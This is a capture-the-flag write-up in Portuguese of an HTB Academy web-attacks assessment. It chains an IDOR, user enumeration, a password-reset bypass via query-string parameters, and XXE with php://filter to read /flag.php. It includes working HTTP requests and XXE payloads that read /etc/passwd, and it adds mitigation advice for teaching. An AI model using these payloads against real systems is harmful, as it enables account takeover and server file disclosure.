# HTB Skills Assessment — Web Attacks

![Category](https://img.shields.io/badge/Category-Web%20Attacks-blueviolet)
![Vulns](https://img.shields.io/badge/Vulns-IDOR%20%7C%20Broken%20Access%20Control%20%7C%20XXE-red)
![Platform](https://img.shields.io/badge/Platform-HTB%20Academy-9cf)
![Status](https://img.shields.io/badge/Status-Flag%20Capturada-success)

> Write-up de um Skills Assessment do HTB Academy onde uma IDOR aparentemente inofensiva foi o ponto de partida de uma cadeia de exploração que terminou em RCE lógico de acesso administrativo e leitura de arquivo via XXE.

---

## Índice

- [Visão Geral](#visão-geral)
- [Attack Chain](#attack-chain)
- [1. Reconhecimento](#1-reconhecimento)
- [2. IDOR — Exposição de Informações de Usuário](#2-idor--exposição-de-informações-de-usuário)
- [3. Enumeração de Usuários](#3-enumeração-de-usuários)
- [4. Análise da Função de Reset de Senha](#4-análise-da-função-de-reset-de-senha)
- [5. Análise do Código-Fonte do Frontend](#5-análise-do-código-fonte-do-frontend)
- [6. Bypass da Autorização de Reset de Senha](#6-bypass-da-autorização-de-reset-de-senha)
- [7. Painel Administrativo](#7-painel-administrativo)
- [8. Identificação da XXE](#8-identificação-da-xxe)
- [9. Local File Disclosure](#9-local-file-disclosure)
- [10. Exfiltração de /flag.php via PHP Filter](#10-exfiltração-de-flagphp-via-php-filter)
- [11. Vulnerabilidades Identificadas](#11-vulnerabilidades-identificadas)
- [12. Causa Raiz](#12-causa-raiz)
- [13. Mitigação](#13-mitigação)
- [14. Lições Aprendidas](#14-lições-aprendidas)
- [Skills Praticadas](#skills-praticadas)
- [Disclaimer](#disclaimer)

---

## Visão Geral

O objetivo deste desafio era escalar privilégios e encadear diferentes vulnerabilidades até obter a flag localizada em `/flag.php`. Uma falha de controle de acesso (IDOR) forneceu as informações necessárias para comprometer a conta administrativa, que por sua vez expôs um endpoint XML vulnerável a XXE usado para ler o código-fonte da flag através do wrapper `php://filter`.

## Attack Chain

```
IDOR — Information Disclosure
        │
        ▼
Enumeração de usuários
        │
        ▼
Identificação da conta administrativa
        │
        ▼
Broken Access Control / Password Reset
        │
        ▼
Account Takeover
        │
        ▼
Acesso ao painel administrativo
        │
        ▼
Endpoint XML
        │
        ▼
XXE — Local File Disclosure
        │
        ▼
PHP Filter + Base64
        │
        ▼
Leitura de /flag.php
        │
        ▼
FLAG
```

> <img src="https://i.imgur.com/HTytDXI.png"/>

---

## 1. Reconhecimento

Após autenticar com as credenciais fornecidas, a análise das requisições via Burp Suite revelou os principais endpoints da aplicação:

```
GET  /api.php/user/{uid}
GET  /api.php/token/{uid}
POST /reset.php
```

O cookie de sessão continha o identificador do usuário diretamente exposto ao cliente:

```
Cookie: PHPSESSID=...
Cookie: uid=74
```

Esse padrão, um `uid` controlável pelo cliente e usado como referência direta para objetos no backend é um forte indicador de possível **IDOR (Insecure Direct Object Reference)**.

> <img src="https://i.imgur.com/ABJq89W.png"/>

---

## 2. IDOR — Exposição de Informações de Usuário

A requisição legítima do usuário autenticado:

```http
GET /api.php/user/74 HTTP/1.1
Host: TARGET
Cookie: PHPSESSID=...
Cookie: uid=74
```

retornava:

```json
{
    "uid": "74",
    "username": "htb-student",
    "full_name": "Paolo Perrone",
    "company": "Schaefer Inc"
}
```

Ao alterar apenas o `uid` na URL, mantendo a mesma sessão autenticada:

```http
GET /api.php/user/75 HTTP/1.1
```

a aplicação retornou os dados de **outro** usuário, confirmando que o backend não validava se o objeto solicitado pertencia ao usuário autenticado:

```
Authenticated User
       │
       │ GET /api.php/user/75
       ▼
Backend
       │
       └── Não valida se UID 75 pertence ao usuário autenticado
                    │
                    ▼
              Dados do usuário
```

> <img src="https://i.imgur.com/dUJSDTV.png"/>

---

## 3. Enumeração de Usuários

Como o endpoint aceitava o `uid` diretamente, foi possível enumerar sequencialmente a base de usuários:

```
/api.php/user/1
/api.php/user/2
...
/api.php/user/45
...
/api.php/user/74
```

Durante a enumeração, o `uid=52` se destacou:

```json
{
    "uid": "52",
    "username": "CENSURADO",
    "full_name": "CENSURADO",
    "company": "Administrator"
}
```

Alvo identificado:

| Campo | Valor |
|---|---|
| UID | 52 |
| Username | CENSURADO |
| Full Name | CENSURADO |
| Company | Administrator |

Apenas conhecer o `uid` não era suficiente para assumir a conta, era necessário explorar o mecanismo de autenticação.

> <img src="https://i.imgur.com/v8O6oYt.png"/>

---

## 4. Análise da Função de Reset de Senha

A tentativa direta de resetar a senha do administrador substituindo o `uid`:

```http
POST /reset.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uid=52&token=<TOKEN>&password=Academy_student!
```

resultou em:

```
Access denied
```

Isso indicou a existência de alguma validação de autorização no processo de reset, o próximo passo foi entender como essa validação era implementada no frontend.

---

## 5. Análise do Código-Fonte do Frontend

O JavaScript responsável pelo fluxo de reset revelou como os parâmetros eram montados:

```javascript
function resetPassword() {
    if ($("#new_password").val() == $("#confirm_new_password").val()) {
        fetch(`/api.php/token/${$.cookie("uid")}`, { method: 'GET' })
            .then(r => r.json())
            .then(json => {
                fetch(`/reset.php`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `uid=${$.cookie("uid")}&token=${json['token']}&password=${$("#new_password").val()}`
                }).then(r => r.text())
                  .then(res => $("#error_string").html(res));
            });
    }
}
```

O ponto-chave: os parâmetros eram enviados via **corpo** da requisição POST. Isso levantou a hipótese de que o backend pudesse tratar de forma diferente parâmetros vindos da URL (query string) versus parâmetros vindos do corpo, uma inconsistência clássica em implementações PHP (`$_REQUEST` vs `$_POST` vs `$_GET`).

---

## 6. Bypass da Autorização de Reset de Senha

Em vez de enviar os parâmetros no corpo, eles foram movidos para a query string, com o corpo vazio:

```http
POST /reset.php?uid=52&token=<TOKEN>&password=Academy_student! HTTP/1.1
Content-Length: 0
```

Resultado:

```
Password changed successfully
```

O backend validava a autorização a partir de uma fonte de parâmetros, mas processava a lógica de negócio a partir de outra permitindo o bypass completo do controle de acesso.

```
User discovered
     ↓
UID = 52
     ↓
Password reset authorization bypass
     ↓
Administrator password changed
     ↓
Administrative account takeover
```

> <img src="https://i.imgur.com/zK8ghbE.png"/>

---

## 7. Painel Administrativo

Com a conta adminstrativa comprometida, novas funcionalidades ficaram acessíveis, entre elas, a criação de eventos:

```http
POST /addEvent.php HTTP/1.1
Content-Type: text/plain;charset=UTF-8
Cookie: uid=52

<root>
    <name>name</name>
    <details>details</details>
    <date>2026-08-19</date>
</root>
```

A presença de XML controlado pelo usuário nesse endpoint administrativo o tornou um candidato natural para testes de **XXE (XML External Entity)**.

> <img src="https://i.imgur.com/c0ex2JT.png"/>

---

## 8. Identificação da XXE

Teste com uma entidade externa apontando para um arquivo local:

```xml
<!DOCTYPE name [
    <!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>
    <name>&test;</name>
    <details>details</details>
    <date>2026-08-19</date>
</root>
```

O parser processou a entidade e o conteúdo de `/etc/passwd` foi refletido na resposta:

```
Event 'root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
' has been created.
```

Confirmação:

```
DOCTYPE enabled + External entities enabled + Local file access = XXE
```

> <img src="https://i.imgur.com/EskVSz4.png"/>

---

## 9. Local File Disclosure

Com a XXE confirmada, o objetivo passou a ser o arquivo indicado pelo enunciado do laboratório: `/flag.php`.

---

## 10. Exfiltração de /flag.php via PHP Filter

Arquivos `.php` podem conter caracteres como `<`, `>` e `&`, que quebram o parsing XML se lidos diretamente. Para contornar isso, foi utilizado o wrapper `php://filter` com `convert.base64-encode`, garantindo que o conteúdo do arquivo fosse retornado de forma segura para o parser:

```xml
<!DOCTYPE name [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
    <name>&company;</name>
    <details>details</details>
    <date>2026-08-19</date>
</root>
```

> <img src="https://i.imgur.com/9ypiCy7.png"/>

---

## 11. Vulnerabilidades Identificadas

| Vulnerabilidade | Impacto |
|---|---|
| IDOR — Exposição de Informações de Usuário | Enumeração de usuários e vazamento de dados |
| Broken Access Control | Acesso a recursos de outros usuários |
| Password Reset Authorization Bypass | Alteração da senha de outra conta |
| Account Takeover | Comprometimento da conta administrativa |
| XXE | Processamento inseguro de XML |
| Local File Disclosure | Leitura de arquivos do servidor |
| Source Code Disclosure | Recuperação do código-fonte de `/flag.php` |
| Insecure XML Parser Configuration | Entidades externas habilitadas |

---

## 12. Causa Raiz

O problema não foi uma falha isolada, mas o **encadeamento** de múltiplas falhas de controle de acesso e validação de entrada:

- **IDOR:** a API confiava no `uid` fornecido pelo cliente (`GET /api.php/user/74`) sem validar se o usuário autenticado tinha permissão para acessar aquele objeto.
- **Password Reset:** havia inconsistência na origem dos parâmetros aceitos pelo backend, permitindo manipular a requisição de forma diferente da prevista pelo frontend.
- **XXE:** o endpoint administrativo aceitava XML controlado pelo usuário com `DOCTYPE`, entidades externas e acesso a arquivos locais habilitados, sem qualquer hardening do parser.

---

## 13. Mitigação

**IDOR / Access Control**
- Autorização deve ser feita no backend com base na sessão autenticada, nunca em parâmetros informados pelo cliente.
- Validar sempre: `authenticated_user.uid == requested_user.uid` (ou permissão administrativa explícita).

**Password Reset**
- Obter parâmetros de uma única fonte esperada e validada explicitamente.
- Tokens aleatórios, de uso único, com expiração e vinculados ao usuário correto.
- Garantir que GET, POST e outras fontes de parâmetros produzam o **mesmo** comportamento de autorização.

**XXE**
- Desabilitar `DOCTYPE`, entidades externas, entidades de parâmetro, `XInclude` e expansão de entidades no parser XML.
- Utilizar biblioteca XML atualizada com configuração segura por padrão.
- Quando XML não for estritamente necessário, preferir JSON para APIs.

---

## 14. Lições Aprendidas

O principal aprendizado deste assessment foi que uma vulnerabilidade aparentemente limitada, uma IDOR que só permitia consultar dados de outros usuários, pode se tornar altamente impactante quando encadeada com outras falhas:

```
IDOR
  → Enumeração
    → Descoberta do Admin
      → Bypass de Controle de Acesso
        → Account Takeover
          → Funcionalidade Privilegiada
            → XXE
              → Local File Disclosure
                → Source Code Disclosure
                  → Flag
```

Em um pentest real, vulnerabilidades não devem ser analisadas isoladamente: o impacto real frequentemente só aparece quando diferentes falhas são combinadas em uma cadeia de ataque.

---

## Skills Praticadas

- Análise de tráfego HTTP com Burp Suite
- Identificação e exploração de IDOR / Broken Access Control
- Análise de código-fonte JavaScript para identificar comportamento do backend
- Bypass de autorização via manipulação de origem de parâmetros (GET vs POST)
- Identificação e exploração de XXE (XML External Entity)
- Uso do wrapper `php://filter` para exfiltração segura de código-fonte PHP
- Construção de uma cadeia de exploração (attack chain) ponta a ponta

---

## Disclaimer

Este write-up documenta a exploração de um ambiente de laboratório controlado (HTB Academy — Skills Assessment), com fins exclusivamente educacionais. As técnicas aqui descritas não devem ser aplicadas contra sistemas sem autorização explícita.
